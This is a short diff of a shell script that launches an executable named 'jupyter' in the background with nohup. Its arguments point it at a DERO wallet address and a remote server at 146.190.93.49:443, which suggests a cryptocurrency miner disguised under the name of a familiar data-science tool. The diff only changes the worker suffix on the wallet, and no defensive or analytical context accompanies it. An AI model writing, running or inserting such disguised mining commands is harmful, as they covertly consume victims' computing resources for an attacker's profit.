@@ -1,2 +1,2 @@
 chmod 700 jupyter 
-nohup ./jupyter -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.BRH4 -r 146.190.93.49:443 -m 14 &
+nohup ./jupyter -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.BRH8 -r 146.190.93.49:443 -m 14 &
